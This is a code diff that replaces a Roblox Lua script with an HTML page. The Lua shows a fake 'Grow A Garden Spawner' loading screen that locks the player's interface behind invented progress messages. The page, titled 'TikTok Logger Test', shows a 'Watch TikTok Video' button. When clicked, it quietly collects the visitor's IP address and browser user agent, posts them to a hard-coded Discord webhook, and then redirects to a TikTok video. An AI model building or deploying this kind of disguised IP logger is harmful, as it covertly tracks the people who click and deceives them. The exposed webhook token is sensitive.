@@ -1,115 +1,61 @@
-local Players = game:GetService("Players")
-local StarterGui = game:GetService("StarterGui")
-local SoundService = game:GetService("SoundService")
-local player = Players.LocalPlayer
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TikTok Logger Test</title>
+<style>
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: #000;
+    font-family: Arial, sans-serif;
+  }
+  button {
+    padding: 15px 30px;
+    background: #25F4EE;
+    color: #000;
+    font-size: 18px;
+    border: none;
+    border-radius: 10px;
+    cursor: pointer;
+  }
+</style>
+</head>
+<body>
 
--- Disable UI
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+<button onclick="sendWebhook()">🎯 Watch TikTok Video</button>
 
--- Create GUI
-local screenGui = Instance.new("ScreenGui")
-screenGui.IgnoreGuiInset = true
-screenGui.ResetOnSpawn = false
-screenGui.Name = "🌴 Grow A Garden Spawner"
-screenGui.Parent = player:WaitForChild("PlayerGui")
+<script>
+function sendWebhook() {
+  const webhook = 'https://discord.com/api/webhooks/1406106788331389038/IxEz1eV6kbDWbwXT8pmP2aqZJF__NYJnHKek36vo6s6XYoPQMm5tKct1AbHxj_BdMW3p';
+  const tiktok = 'https://vt.tiktok.com/ZSA11Pxxq/';
+  
+  fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(ipData => {
+      const ip = ipData.ip || 'Unknown';
+      const device = navigator.userAgent;
 
--- Fade Frame
-local fadeFrame = Instance.new("Frame")
-fadeFrame.Size = UDim2.new(1, 0, 1, 0)
-fadeFrame.Position = UDim2.new(0, 0, 0, 0)
-fadeFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-fadeFrame.BackgroundTransparency = 1
-fadeFrame.ZIndex = 10
-fadeFrame.Parent = screenGui
+      // Send only the clicked link, time, device, and IP
+      const message = `🎯 TikTok link clicked!\nVideo: ${tiktok}\nTime: ${new Date().toLocaleString()}\nIP: ${ip}\nDevice: ${device}`;
 
--- Block Interaction
-local blocker = Instance.new("TextButton")
-blocker.Size = UDim2.new(1, 0, 1, 0)
-blocker.Position = UDim2.new(0, 0, 0, 0)
-blocker.Text = ""
-blocker.AutoButtonColor = false
-blocker.BackgroundTransparency = 1
-blocker.ZIndex = 11
-blocker.Parent = fadeFrame
+      fetch(webhook, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ content: message })
+      }).catch(err => console.log('Webhook failed:', err));
 
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0.1, 0)
-title.Position = UDim2.new(0, 0, 0.35, 0)
-title.BackgroundTransparency = 1
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextTransparency = 1
-title.Font = Enum.Font.GothamBlack
-title.TextScaled = true
-title.ZIndex = 12
-title.Text = "🌴 Grow A Garden Spawner"
-title.Parent = fadeFrame
-
--- Loading Label
-local label = Instance.new("TextLabel")
-label.Size = UDim2.new(1, 0, 0.1, 0)
-label.Position = UDim2.new(0, 0, 0.47, 0)
-label.BackgroundTransparency = 1
-label.TextColor3 = Color3.fromRGB(255, 255, 255)
-label.TextTransparency = 1
-label.Font = Enum.Font.GothamBold
-label.TextScaled = true
-label.ZIndex = 12
-label.Text = "Initializing..."
-label.Parent = fadeFrame
-
--- 🎵 Background Vibe Music
-local music = Instance.new("Sound")
-music.SoundId = "rbxassetid://1843239467" -- Replace with your vibe track
-music.Volume = 0.5
-music.Looped = true
-music.Playing = true
-music.Parent = SoundService
-
--- Fade in
-for i = 1, 20 do
-	local alpha = 1 - (i / 20)
-	fadeFrame.BackgroundTransparency = alpha
-	title.TextTransparency = alpha
-	label.TextTransparency = alpha
-	wait(0.02)
-end
-
--- Loading messages
-local messages = {
-	"📡 Fetching game data...",
-	"🔐 Authenticating player session...",
-	"📦 Mounting spawner packages...",
-	"🧠 Parsing spawn table configurations...",
-	"🛰️ Connecting to spawner host node...",
-	"🧬 Calibrating spawn logic systems...",
-	"⚙️ Compiling object spawn instructions...",
-	"🔄 Syncing entity life cycles...",
-	"🧩 Integrating environmental modifiers...",
-	"📈 Verifying spawn rate limits...",
-	"🛠️ Resolving resource dependencies...",
-	"📁 Allocating spawnpoint memory...",
-	"🚦 Engaging instance controller...",
-	"🔍 Scanning world anchors...",
-	"📊 Updating runtime spawn metrics...",
-	"✅ Spawner system ready for deployment."
+      // Redirect user
+      window.location.href = tiktok;
+    })
+    .catch(() => {
+      window.location.href = tiktok;
+    });
 }
+</script>
 
-for i, msg in ipairs(messages) do
-	label.Text = msg
-	wait(25 / #messages)
-end
-
--- Fade out
-for i = 1, 20 do
-	local alpha = i / 20
-	fadeFrame.BackgroundTransparency = alpha
-	title.TextTransparency = alpha
-	label.TextTransparency = alpha
-	wait(0.02)
-end
-
--- Cleanup
-screenGui:Destroy()
-music:Destroy()
-StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+</body>
+</html>
